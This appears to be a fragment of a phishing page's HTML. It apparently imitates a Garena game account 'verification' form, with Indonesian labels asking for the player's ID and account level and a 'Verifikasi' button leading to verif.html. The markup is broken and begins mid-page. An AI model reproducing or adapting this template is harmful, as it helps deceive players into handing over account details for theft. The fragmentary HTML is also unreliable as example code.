...
<img src="" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12"></span></div><div class="a_wrap"><div></div>
<span class="txt_c"></span>
<br>
 <img src="http://www.questforantonia.com/wp-content/uploads/2019/06/logo.png" width="250"/><br>
 <br>
</center>
<label><font color="gold">ID Anda</font></label>
<input  name="nickname"  placeholder="Masukan ID kamu" type="text" required>


</a></span><span class="">
<center><div class="btn_fb"></center>
<label><font color="gold">Level Akun</font></label>
<input  name="namafb"  placeholder="Masukan Level Akun Kamu" type="text" required>
<br>

<center><a href="verif.html"><button>Verifikasi</button></a>
<center><a href="verif.html" class="button"></center>
</div></div></div></div>
